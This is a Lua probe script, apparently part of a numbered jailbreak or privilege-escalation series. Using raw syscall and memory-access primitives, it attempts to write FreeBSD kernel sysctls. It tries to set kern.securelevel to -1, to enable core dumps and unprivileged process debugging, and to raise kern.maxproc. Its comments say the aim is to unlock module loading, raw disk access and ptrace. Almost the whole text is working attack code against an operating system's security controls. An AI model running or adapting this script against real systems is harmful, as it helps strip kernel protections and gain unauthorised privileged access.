-- CRASH_CLASS: HIGH (writing kernel state)
-- PROBE 43f: Sysctl WRITE paths — kern.securelevel, coredump, etc.
--
-- All previous sysctl testing was READ-only. The __sysctl syscall
-- also accepts newp/newlen for writes. If we can write:
--   kern.securelevel = -1 → enables kldload, raw disk, etc.
--   kern.coredump = 1 + kern.corefile = path → crash writes memory
--   security.bsd.unprivileged_proc_debug = 1 → enables ptrace

print("=== PROBE 43f: SYSCTL WRITE PATHS ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc_getpid = make_syscall(20)
local sc_sysctl = make_syscall(202)

local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

-- Helper: read a sysctl int value
local function sysctl_read_int(mib_vals)
    local mib = memory.alloc(#mib_vals * 4)
    for i, v in ipairs(mib_vals) do safe_wd(mib + (i-1)*4, v) end
    local out = memory.alloc(8)
    safe_wd(out, 0)
    local lenp = memory.alloc(8)
    safe_wd(lenp, 4)
    local ok, ret = pcall(function()
        return sc_sysctl(uint64(mib), uint64(#mib_vals),
            uint64(out), uint64(lenp), uint64(0), uint64(0))
    end)
    local rv = ok and to_num(ret) or -999
    return rv, safe_rd(out)
end

-- Helper: write a sysctl int value
local function sysctl_write_int(mib_vals, new_val)
    local mib = memory.alloc(#mib_vals * 4)
    for i, v in ipairs(mib_vals) do safe_wd(mib + (i-1)*4, v) end
    -- Read current value first (oldp)
    local out = memory.alloc(8)
    safe_wd(out, 0)
    local lenp = memory.alloc(8)
    safe_wd(lenp, 4)
    -- New value buffer
    local newp = memory.alloc(8)
    safe_wd(newp, new_val)

    local ok, ret = pcall(function()
        return sc_sysctl(uint64(mib), uint64(#mib_vals),
            uint64(out), uint64(lenp), uint64(newp), uint64(4))
    end)
    local rv = ok and to_num(ret) or -999
    return rv, safe_rd(out)
end

--------------------------------------------------------------------
-- A) Read current securelevel
--------------------------------------------------------------------
print("")
print("=== A: KERN.SECURELEVEL READ ===")
do
    -- kern.securelevel = {1, 33} on FreeBSD
    local rv, val = sysctl_read_int({1, 33})
    print(string.format("  read: ret=%d val=%d", rv, val or -1))
end

--------------------------------------------------------------------
-- B) Try to WRITE securelevel = -1
--------------------------------------------------------------------
print("")
print("=== B: KERN.SECURELEVEL WRITE ===")
do
    -- Write -1 (0xFFFFFFFF as unsigned)
    local rv, old = sysctl_write_int({1, 33}, 0xFFFFFFFF)
    print(string.format("  write(-1): ret=%d old_val=%d", rv, old or -1))

    -- Verify
    if rv == 0 then
        local rv2, val = sysctl_read_int({1, 33})
        print(string.format("  verify: ret=%d val=%d", rv2, val or -1))
        if val and val ~= 1024 then
            print("  *** SECURELEVEL CHANGED ***")
        end
    end
end

--------------------------------------------------------------------
-- C) kern.coredump — enable core dumps
--------------------------------------------------------------------
print("")
print("=== C: KERN.COREDUMP ===")
do
    -- kern.coredump = {1, 27}
    local rv, val = sysctl_read_int({1, 27})
    print(string.format("  read: ret=%d val=%d", rv, val or -1))

    if rv == 0 and val == 0 then
        -- Try enabling
        local rv2, old = sysctl_write_int({1, 27}, 1)
        print(string.format("  write(1): ret=%d old=%d", rv2, old or -1))
    end
end

--------------------------------------------------------------------
-- D) security.bsd.unprivileged_proc_debug
--------------------------------------------------------------------
print("")
print("=== D: SECURITY.BSD.UNPRIVILEGED_PROC_DEBUG ===")
do
    -- security.bsd = {14, 2}, unprivileged_proc_debug likely at {14, 2, X}
    -- On FreeBSD: security.bsd.unprivileged_proc_debug = sysctl {14, 2, 2}
    local rv, val = sysctl_read_int({14, 2, 2})
    print(string.format("  read: ret=%d val=%d", rv, val or -1))

    if rv == 0 then
        local rv2, old = sysctl_write_int({14, 2, 2}, 1)
        print(string.format("  write(1): ret=%d old=%d", rv2, old or -1))
    end
end

--------------------------------------------------------------------
-- E) kern.maxproc — resource limits
--------------------------------------------------------------------
print("")
print("=== E: KERN.MAXPROC WRITE ===")
do
    local rv, val = sysctl_read_int({1, 6})
    print(string.format("  read: ret=%d val=%d", rv, val or -1))

    if rv == 0 then
        local rv2, old = sysctl_write_int({1, 6}, 10000)
        print(string.format("  write(10000): ret=%d old=%d", rv2, old or -1))
    end
end

--------------------------------------------------------------------
-- F) debug.kdb.enter — kernel debugger (will hang if it works!)
-- Only test if other writes succeeded
--------------------------------------------------------------------
print("")
print("=== F: MISC READS ===")
do
    -- kern.maxfiles {1, 7}
    local rv, val = sysctl_read_int({1, 7})
    print(string.format("  kern.maxfiles: ret=%d val=%d", rv, val or -1))

    -- kern.somaxconn {1, 35}
    rv, val = sysctl_read_int({1, 35})
    print(string.format("  kern.somaxconn: ret=%d val=%d", rv, val or -1))

    -- net.inet.tcp.mssdflt {4, 2, 6, 16}
    rv, val = sysctl_read_int({4, 2, 6, 16})
    print(string.format("  tcp.mssdflt: ret=%d val=%d", rv, val or -1))
end

print("")
print("=== PROBE 43f COMPLETE ===")
